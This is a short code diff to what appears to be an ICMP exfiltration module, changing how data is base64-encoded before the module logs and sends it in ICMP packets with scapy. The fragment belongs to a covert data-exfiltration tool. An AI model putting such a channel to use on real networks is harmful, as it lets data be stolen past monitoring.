@@ -8,7 +8,7 @@ app_exfiltrate = None
 
 
 def send(data):
-    data = base64.b64encode(data)
+    data = base64.b64encode(data.encode())
     app_exfiltrate.log_message(
         'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
     scapy.sendp(scapy.Ether() /
